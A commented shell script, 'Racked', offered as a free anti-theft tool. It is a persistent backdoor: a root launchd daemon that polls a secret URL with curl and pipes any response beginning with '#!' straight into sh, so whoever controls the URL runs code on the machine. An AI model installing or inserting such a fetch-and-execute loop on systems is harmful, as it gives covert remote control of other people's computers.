#!/bin/sh

# Racked is a very simple (10 lines) backdoor written in shell.
#
# Its intent is only **to track your stolen computer**. If you are evil and you
# want to secretly stalk someone, or control someone's computer, please look
# somewhere else, there are plenty of better scripts that will help you much
# more. This is not the right tool for you.

# This script does only one thing - it checks a _**URL**_ in defined
# _**intervals**_, and if it finds the _**trigger**_ at the beggining of the
# page, it just runs it **as a script**. So the only thing that you do to
# protect your computer, is choosing a URL and making the script run on every
# boot.
#
# So the script **does not do the actual tracking**, it only ensures that you
# will have some kind of access to it. It's like SSH, but it's so much simplier
# and unlike many antithief solutions, it's also free.


# ## Hosting

# You only need **one URL** that you have access to. You can use your website,
# an FTP, or if you want something geeky and free, use a pastebin! :)

# ### Gist

# [Gist](http://gist.github.com) is a perfect tool for our purpose! It's free,
# easy to modify, and it's backed by a Git repo.
#
# All you have to do is to create a private repository. Then get your gist id
# and insert it into the following URL...
#
# **https://raw.github.com/gist/abc123abc123abc12345**
#
# ... and test if it works, it should work...


# ## Configuration

# **URL**

# Please choose this URL wisely - this line is a real **backdoor to your
# computer**, right? It's really like a key to your files. You should be the
# only one knowing it and with access to change it.
URL="yourwebsite.com/yoursecretscriptfile"

# **Trigger**

# The default trigger is a [hashbang](http://en.wikipedia.org/wiki/Shebang_(Unix\))
# as executable scripts usually start with it.
TRIGGER="#!"

# **Delay**

# You usually want something like 15 or 30 minutes. You'll have to convert it,
# however - it's in seconds.
DELAY=5


# ## Installation

# ### Requirements

# You only need [curl](http://curl.haxx.se/). On Mac OS X, it's already
# installed. Most Linux distributions have it in their package systems, if not
# installed too.

# ### Installation on Mac (launchd)

# - Save this script as **/opt/racked.sh**
# - Save the following XML as:
#   **/Library/LaunchDaemons/racked.plist**

#     <?xml version="1.0" encoding="UTF-8"?>
#     <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
#         "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
#     <plist version="1.0">
#     <dict>
#         <key>Label</key><string>racked</string>
#         <key>KeepAlive</key><true/>
#         <key>RunAtLoad</key><true/>
#         <key>ProgramArguments</key>
#         <array>
#             <string>/opt/racked.sh</string>
#         </array>
#     </dict>
#     </plist>


# ## Caveeats

# **launchd won't start the script**
#
# _Check the rights of the plist. Plist requires that the owner of plist is
# **root**, that might be the problem if you've just copied the file using
# Finder._

# **Strange things happen - my wallpaper is changing all the time, I hear
# strange voices, and the webcam is flashing every minute....**
#
# _Either you use a stolen laptop, or someone's got the access to your URL. I
# told you it's a backdoor!_


# ### Code

# Now there is the magic... Dumb, short, yet powerful, see?
while [ true ]; do
	page=$(curl "$URL" 2>/dev/null)
	if [ $? -eq 0 ] && [[ $page == $TRIGGER* ]]; then
		echo "$page" | sh
	fi
	sleep $DELAY
done
